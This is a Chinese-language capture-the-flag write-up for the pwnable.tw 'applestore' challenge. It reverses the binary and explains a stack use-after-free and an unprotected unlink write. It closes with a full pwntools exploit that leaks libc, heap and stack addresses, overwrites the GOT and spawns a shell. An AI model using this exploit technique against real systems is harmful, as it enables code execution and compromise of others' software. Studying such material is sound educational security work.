# [原创]pwnable.tw新手向write up(六) applestore-经典unlink攻击与UAF
https://bbs.kanxue.com/thread-259476.htm
## checksec
```
[0] % checksec applestore
[*] '/home/dylan/ctfs/pwnable_tw/applestore/applestore'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

## 逆向
IDA看一下程序结构,一开始看到菜单题还以为是堆题,后来才发现并不是.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signal(14, timeout);
  alarm(0x3Cu);
  memset(&myCart, 0, 0x10u);
  menu();
  return handler();
}
```

main函数没啥,一个alarm函数,可以选择patch掉.初始化了一块内存,这块内存其实就是用来保存双向链表的地方.menu函数打印菜单,接着看handler()函数:
```c
unsigned int handler()
{
  char choice; // [esp+16h] [ebp-22h]
  unsigned int canary; // [esp+2Ch] [ebp-Ch]
 
  canary = __readgsdword(0x14u);
  while ( 1 )
  {
    printf("> ");
    fflush(stdout);
    my_read(&choice, 0x15u);
    switch ( atoi(&choice) )
    {
      case 1:
        list();
        break;
      case 2:
        add();
        break;
      case 3:
        delete();
        break;
      case 4:
        cart();
        break;
      case 5:
        checkout();
        break;
      case 6:
        puts("Thank You for Your Purchase!");
        return __readgsdword(0x14u) ^ canary;
      default:
        puts("It's not a choice! Idiot.");
        break;
    }
  }
}
```
读取输入然后执行相应的函数,这里我们先看看读取输入的my_read函数.

```c
char *__cdecl my_read(void *buf, size_t nbytes)
{
  char *result; // eax
  ssize_t v3; // [esp+1Ch] [ebp-Ch]
 
  v3 = read(0, buf, nbytes);
  if ( v3 == -1 )
    return puts("Input Error.");
  result = buf + v3;
  *(buf + v3) = 0;                              // 末尾截断
  return result;
}
```
调用read函数读取指定数量的字节,然后末尾用0来截断.

```c
int list()
{
  puts("=== Device List ===");
  printf("%d: iPhone 6 - $%d\n", 1, 199);
  printf("%d: iPhone 6 Plus - $%d\n", 2, 299);
  printf("%d: iPad Air 2 - $%d\n", 3, 499);
  printf("%d: iPad Mini 3 - $%d\n", 4, 399);
  return printf("%d: iPod Touch - $%d\n", 5, 199);
}
```
list函数只是打印一些商品信息

```c
unsigned int add()
{
  Apple *apple; // [esp+1Ch] [ebp-2Ch]
  char choice; // [esp+26h] [ebp-22h]
  unsigned int canary; // [esp+3Ch] [ebp-Ch]
 
  canary = __readgsdword(0x14u);
  printf("Device Number> ");
  fflush(stdout);
  my_read(&choice, 0x15u);
  switch ( atoi(&choice) )
  {
    case 1:
      apple = create("iPhone 6", 199);
      insert(apple);
      goto LABEL_8;
    case 2:
      apple = create("iPhone 6 Plus", 299);
      insert(apple);
      goto LABEL_8;
    case 3:
      apple = create("iPad Air 2", 499);
      insert(apple);
      goto LABEL_8;
    case 4:
      apple = create("iPad Mini 3", 399);
      insert(apple);
      goto LABEL_8;
    case 5:
      apple = create("iPod Touch", 199);
      insert(apple);
LABEL_8:
      printf("You've put *%s* in your shopping cart.\n", apple->name);
      puts("Brilliant! That's an amazing idea.");
      break;
    default:
      puts("Stop doing that. Idiot!");
      break;
  }
  return __readgsdword(0x14u) ^ canary;
}
```
如果我们购买一个商品,add函数会调用对应的create函数来生成一个结构体保存商品信息,接着调用insert函数处理结构体,我们先看看create函数:
```c
Apple *__cdecl create(int name, char *price)
{
  Apple *v2; // eax MAPDST
 
  v2 = malloc(0x10u);
  v2->price = price;
  asprintf(&v2->name, "%s", name);
  v2->fd = 0;
  v2->bk = 0;
  return v2;
}
```
这个题目采用了双向链表的结构来保存我们的商品信息,具体结构如下:

```c
struct Apple
{
  char *name;
  int price;
  int *bk;
  int *fd;
};
```
接着跟进insert函数:
```c
Apple *__cdecl insert(Apple *apple)
{
  Apple *result; // eax
  int *i; // [esp+Ch] [ebp-4h]
 
  for ( i = &myCart; i[2]; i = i[2] )
    ;
  i[2] = apple;
  result = apple;
  apple->fd = i;
  return result;
}
```
myCart这块内存就是在main函数被初始化的内存,这里用来保存我们的商品数据结构.myCart[0]为链表头,myCart[2]开始才是我们的第一个商品.
```c
unsigned int delete()
{
  signed int count; // [esp+10h] [ebp-38h]
  Apple *apple_target; // [esp+14h] [ebp-34h]
  int index_int; // [esp+18h] [ebp-30h]
  Apple *bk_apple; // [esp+1Ch] [ebp-2Ch]
  Apple *fd_apple; // [esp+20h] [ebp-28h]
  char index; // [esp+26h] [ebp-22h]
  unsigned int canary; // [esp+3Ch] [ebp-Ch]
 
  canary = __readgsdword(0x14u);
  count = 1;
  apple_target = myCart.device;
  printf("Item Number> ");
  fflush(stdout);
  my_read(&index, 0x15u);
  index_int = atoi(&index);
  while ( apple_target )
  {
    if ( count == index_int )
    {
      bk_apple = apple_target->bk;
      fd_apple = apple_target->fd;
      if ( fd_apple )
        fd_apple->bk = bk_apple;
      if ( bk_apple )
        bk_apple->fd = fd_apple;
      printf("Remove %d:%s from your shopping cart.\n", count, apple_target->name);
      return __readgsdword(0x14u) ^ canary;
    }
    ++count;
    apple_target = apple_target->bk;
  }
  return __readgsdword(0x14u) ^ canary;
}
```

delete函数用来将双向链表从链中拆除,操作类似于unlink,即修改前后链表的fd和bk,但是这个并没有任何防护手段.

```c
int cart()
{
  signed int index; // eax MAPDST
  int total_price; // [esp+1Ch] [ebp-2Ch]
  Apple *apple; // [esp+20h] [ebp-28h]
  char choice; // [esp+26h] [ebp-22h]
  unsigned int canary; // [esp+3Ch] [ebp-Ch]
 
  canary = __readgsdword(0x14u);
  index = 1;
  total_price = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(&choice, 0x15u);
  if ( choice == 'y' )
  {
    puts("==== Cart ====");
    for ( apple = myCart.device; apple; apple = apple->bk )
    {
      printf("%d: %s - $%d\n", ++index, apple->name, apple->price);
      total_price += apple->price;
    }
  }
  return total_price;
}
```

cart函数打印所有商品信息,可以考虑信息泄露.

```c
unsigned int checkout()
{
  int total_price; // [esp+10h] [ebp-28h]
  Apple apple; // [esp+18h] [ebp-20h]
  unsigned int canary; // [esp+2Ch] [ebp-Ch]
 
  canary = __readgsdword(0x14u);
  total_price = cart();
  if ( total_price == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(&apple.name, "%s", "iPhone 8");
    apple.price = 1;
    insert(&apple);
    total_price = 7175;
  }
  printf("Total: $%d\n", total_price);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ canary;
}
```
checkout函数乍一看好像没什么卵用,并没有后门函数什么的,但是这有一个小彩蛋,如果总价格是7174的话,会附赠你一部一美元的手机.不妨回顾一下create函数,正常add函数添加的商品结构体都是malloc出来的,也就是在堆上,而这个一美元的手机却是保存在栈上的,这个函数结束之后栈地址依然留在我们的双向链表之中,这有点类似于堆题目里面的Use After Free.

## 利用方法
### step1
首先,我们要触发菜单,才能创造出这个堆里面的栈地址,但这个四元一次方程运算量还是有那么一点的,这里我们借助python来计算一下:

```
[0] % python
Python 2.7.12 (default, Apr 15 2020, 17:07:12)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from z3 import *
>>> v1,v2,v3,v4,v5=Ints('v1 v2 v3 v4 v5')
>>> x=Solver()
>>> x.add(199*v1+299*v2+499*v3+399*v4+199*v5==7174)
>>> x.check()
sat
>>> x.model()
[v2 = -2, v4 = -10, v3 = 14, v1 = -6, v5 = 30]
>>> x.add(v1>=0,v2>=0,v3>=0,v4>=0,v5>=0)
>>> x.check()
sat
>>> x.model()
[v2 = 0, v4 = 10, v3 = 0, v1 = 16, v5 = 0]
```
也就是说,购买1号商品16个,4号商品10个正好就是7174块钱.
### step2
到这可能就卡壳了,虽然我们把一个局部变量的地址放到了堆里面,但是我们并没有办法来控制它的内容,哪怕能修改,那么栈地址在函数返回之后不久没用了么,还怎么操作?这里我们先看一看handler函数的汇编实现:

```
.text:08048C31                 jmp     eax             ; switch jump
.text:08048C33 ; ---------------------------------------------------------------------------
.text:08048C33
.text:08048C33 loc_8048C33:                            ; CODE XREF: handler+5Ej
.text:08048C33                                         ; DATA XREF: .rodata:08049088o
.text:08048C33                 call    list            ; jumptable 08048C31 case 1
.text:08048C38                 jmp     short loc_8048C63
.text:08048C3A ; ---------------------------------------------------------------------------
.text:08048C3A
.text:08048C3A loc_8048C3A:                            ; CODE XREF: handler+5Ej
.text:08048C3A                                         ; DATA XREF: .rodata:08049088o
.text:08048C3A                 call    add             ; jumptable 08048C31 case 2
.text:08048C3F                 jmp     short loc_8048C63
.text:08048C41 ; ---------------------------------------------------------------------------
.text:08048C41
.text:08048C41 loc_8048C41:                            ; CODE XREF: handler+5Ej
.text:08048C41                                         ; DATA XREF: .rodata:08049088o
.text:08048C41                 call    delete          ; jumptable 08048C31 case 3
.text:08048C46                 jmp     short loc_8048C63
.text:08048C48 ; ---------------------------------------------------------------------------
.text:08048C48
.text:08048C48 loc_8048C48:                            ; CODE XREF: handler+5Ej
.text:08048C48                                         ; DATA XREF: .rodata:08049088o
.text:08048C48                 call    cart            ; jumptable 08048C31 case 4
.text:08048C4D                 jmp     short loc_8048C63
.text:08048C4F ; ---------------------------------------------------------------------------
.text:08048C4F
.text:08048C4F loc_8048C4F:                            ; CODE XREF: handler+5Ej
.text:08048C4F                                         ; DATA XREF: .rodata:08049088o
.text:08048C4F                 call    checkout        ; jumptable 08048C31 case 5
.text:08048C54                 jmp     short loc_8048C63
.text:08048C56 ; ---------------------------------------------------------------------------
```
只截了关键部分,提醒一下,我们将栈地址放到堆上的时候,局部变量保存在ebp-22的地址.通过汇编代码可以看到,每个函数在结束调用之后,并没有对栈进行操作,所以这几个函数用的栈都是同一个地址的内存空间,也就是说,如果checkout函数之外的函数对ebp-22进行了操作,也就是对堆上的第27个结构进行了操作.回顾一下add,delete,cart三个函数,我们就可以发现我们是可以对ebp-22这块地址进行操作的,只不过我们需要用\x00来隔断函数需要的选项和我们构造的结构体.比如cart函数,我们可以先输入一个'y\x00'来进行下一步,接着在字符串后面跟上我们构造的结构体,这样cart就会打印任意地址的数据.

根据这个特点,我们泄露libc基地址,堆地址和栈地址.
### step3
光泄露了信息还不行,我们还需要进一步的操作才能getshell.程序还有一个漏洞,就是delete函数.这个函数的操作非常类似unlink,而且还没有任何防护,所以我们可以通过这个函数进行任意地址写,delete函数关键部分如下:

```c
bk_apple = apple_target->bk;
fd_apple = apple_target->fd;
if ( fd_apple )
    fd_apple->bk = bk_apple;
if ( bk_apple )
    bk_apple->fd = fd_apple;
```
简化一下就成了

```c
fd_apple->bk = bk 相当于 fd[3]=bk
bk_apple->fd = fd 相当于 bk[2]=fd
```
这样,我们只要把bk修改为目标地址-8,就可以将任意的fd写入目标地址了.这里我们可以劫持ebp,从而控制handler函数的栈.只要把栈迁移到GOT底部-22的位置,我们就可以用handler中的my_read函数改写GOT表中的值,从而getshell.

## exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from PwnContext.core import *
local = True
 
# Set up pwntools for the correct architecture
exe = './' + 'applestore'
elf = context.binary = ELF(exe)
 
#don't forget to change it
host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10104)
 
#don't forget to change it
#ctx.binary = './' + 'applestore'
ctx.binary = exe
libc = args.LIBC or 'libc.so'
elf_libc = ELF(libc)
ctx.debug_remote_libc = True
ctx.remote_libc = libc
ctx.custom_lib_dir = '/home/dylan/ctfs/pwnable_tw/applestore'
if local:
    #context.log_level = 'debug'
    try:
        io = ctx.start()
    except Exception as e:
        print(e.args)
        print("It can't work,may be it can't load the remote libc!")
        print("It will load the local process")
        io = process(exe)
else:
    io = remote(host,port)
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
 
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
def add(index,count):
    for i in range(count):
        io.recvuntil('>')
        io.sendline('2')
        io.recvuntil('Device Number> ')
        io.sendline(str(index))
 
def exp():
    # iphone $1
    add(4,10)
    add(1,16)
    io.recvuntil('>')
    io.sendline('5')
    io.recvuntil('Let me check your cart. ok? (y/n) > ')
    io.sendline('y')
 
    # libc_base_addr
    payload='y\x00' + p32(elf.got['read'])+p32(0)+p32(0)+p32(0)
    io.sendline('4')
    io.recvuntil('Let me check your cart. ok? (y/n) > ')
    io.sendline(payload)
    io.recvuntil('27: ')
    data = u32(io.recv(4))
    libc_base = data - elf_libc.symbols['read']
    system_addr = libc_base + elf_libc.symbols['system']
    bin_sh_addr = libc_base + elf_libc.search('/bin/sh').next()
    log.success('libc_base_addr =' + hex(libc_base))
    log.success('system_addr =' + hex(system_addr))
    log.success('bin_sh_addr =' + hex(bin_sh_addr))
 
    # heap_addr
    payload='y\x00' + p32(0x0804B070)+p32(0)+p32(0)+p32(0)
    io.sendline('4')
    io.recvuntil('Let me check your cart. ok? (y/n) > ')
    io.sendline(payload)
    io.recvuntil('27: ')
    heap_addr = u32(io.recv(4))
    log.success('heap =' + hex(heap_addr))
 
    # stack_addr
    stack_addr = heap_addr
    for i in range(26):
        payload='y\x00' + p32(stack_addr+8)+p32(0)+p32(0)+p32(0)
        io.sendline('4')
        io.recvuntil('Let me check your cart. ok? (y/n) > ')
        io.sendline(payload)
        io.recvuntil('27: ')
        stack_addr = u32(io.recv(4))
    log.success('stack_addr =' + hex(stack_addr))
 
    # unlink
    payload=str(27) + p32(0) + p32(0) + p32(stack_addr+0x20-0xc) + p32(elf.got['asprintf']+0x22)
    io.recvuntil('>')
    io.sendline('3')
    io.recvuntil('Item Number> ')
    io.sendline(payload)
 
    payload='sh\x00\x00'+p32(system_addr)
    io.sendline(payload)
 
 
if __name__ == '__main__':
    exp()
    io.interactive()
```